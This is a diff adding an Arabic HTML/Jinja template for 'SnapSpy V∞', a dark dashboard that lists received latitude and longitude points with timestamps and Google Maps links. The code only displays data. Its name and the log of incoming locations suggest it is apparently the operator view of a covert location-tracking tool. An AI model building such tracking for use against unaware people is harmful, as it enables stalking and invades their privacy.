@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>📍 SnapSpy V∞ | سجل المواقع</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #111;
+      color: #fff;
+      padding: 30px;
+    }
+
+    h2 {
+      color: #00e0ff;
+      margin-bottom: 20px;
+    }
+
+    .point {
+      background: #1c1c1c;
+      border-left: 5px solid #00e0ff;
+      padding: 15px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 224, 255, 0.1);
+    }
+
+    .point b {
+      color: #0ff;
+    }
+
+    a {
+      color: #ffb347;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .empty {
+      color: #888;
+      background: #222;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
+    }
+  </style>
+</head>
+<body>
+  <h2>🗺️ سجل المواقع المرسلة</h2>
+
+  {% if logs %}
+    {% for log in logs %}
+      <div class="point">
+        📍 <b>إحداثيات:</b> {{ log.lat }}, {{ log.lon }}<br>
+        🕒 <b>الوقت:</b> {{ log.time }}<br>
+        🔗 <a href="https://www.google.com/maps?q={{ log.lat }},{{ log.lon }}" target="_blank">رؤية على الخريطة</a>
+      </div>
+    {% endfor %}
+  {% else %}
+    <div class="empty">🚫 لا توجد بيانات حتى الآن.</div>
+  {% endif %}
+</body>
+</html>
